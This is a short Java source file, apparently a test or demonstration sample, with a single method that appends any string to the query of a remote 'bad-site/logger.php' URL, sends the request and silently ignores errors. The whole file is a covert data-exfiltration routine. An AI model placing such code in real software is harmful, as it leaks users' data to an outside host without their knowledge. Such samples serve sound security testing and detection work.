import java.net.URL;
import java.net.URLConnection;


public class Test {
	public static void get(String data){
		try {
			URL yahoo = new URL("http://www.ben-holland.com/bad-site/logger.php?"+data);
			URLConnection yc = yahoo.openConnection();
	        yc.getInputStream();
		} catch (Exception e) {
			// nothing
		}
	}
}
